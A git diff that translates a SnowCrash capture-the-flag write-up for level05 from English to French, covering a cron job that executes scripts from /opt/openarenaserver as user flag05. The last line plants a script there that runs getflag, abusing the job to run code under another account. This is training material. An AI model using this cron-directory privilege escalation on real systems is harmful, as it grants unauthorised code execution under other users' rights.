@@ -1,6 +1,6 @@
-# Level 05
+# 05 - Tache planifiée: Cron
 
-- We login as user level05, we can see a notification: `You have new mail`.
+- On se connecte en tant que level05, on peut voir une notification: `You have new mail`.
 ```
 level05@SnowCrash:~$ ls /var/mail
 level05
@@ -11,14 +11,11 @@ level05@SnowCrash:~$ cat /var/mail/level05
 */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
 ```
 
-- It looks like a [Cron](https://en.wikipedia.org/wiki/Cron) instruction. It indicates that every two minutes, the command `/usr/sbin/openarenaserver` will be executed by user flag05.
+- Il s'agit d'une instruction [Cron](https://fr.wikipedia.org/wiki/Cron). Elle indique que toutes les deux minutes, `/usr/sbin/openarenaserver` sera exécutée par flag05. 
 ```
-level05@SnowCrash:~$ ls -l /usr/sbin/openarenaserver
--rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
+level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
 ```
-
-- Let's `cat /usr/sbin/openarenaserver`:
-```shell
+```sh
 #!/bin/sh
 
 for i in /opt/openarenaserver/* ; do
@@ -27,8 +24,7 @@ for i in /opt/openarenaserver/* ; do
 done
 ```
 
-
-- This shell script runs `bash -x` on all the items present in the directory `/opt/openarenaserver/`, with a fixed limit of 5 seconds for each execution. Afterward, the respective item is deleted, so:
+- Le script exécute `bash -x` sur tous les éléments présents dans le répertoire `/opt/openarenaserver/`, avec une limite fixe de 5 secondes pour chaque exécution. Ensuite, l'élément respectif est supprimé, du coup:
 ```
 level05@SnowCrash:~$ echo "getflag > /tmp/flag2level06" > /opt/openarenaserver/exploit.sh
 ```
